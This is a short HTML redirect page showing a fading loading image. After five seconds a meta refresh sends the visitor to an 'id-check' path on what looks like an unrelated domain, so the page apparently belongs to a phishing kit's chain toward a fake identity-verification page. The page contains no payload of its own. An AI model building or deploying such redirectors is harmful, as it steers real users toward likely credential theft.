<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>Redirection</title>
<style>
body {
  display: flex;
  justify-content: center;
  align-items: center;
  height: 100vh;
  background-color: #f1f1f1;
}

.loader {
  animation: fade 2s linear infinite;
  max-width: 200px; /* Taille maximale de l'image */
}

@keyframes fade {
  0% {
    opacity: 0;
  }
  50% {
    opacity: 1;
  }
  100% {
    opacity: 0;
  }
}
</style>
<meta http-equiv="refresh" content="5;url=https://s-id-check.neupdates.com/spa/spa">
</head>
<body>
<img src="l.png" alt="Loading..." class="loader">
</body>
</html>
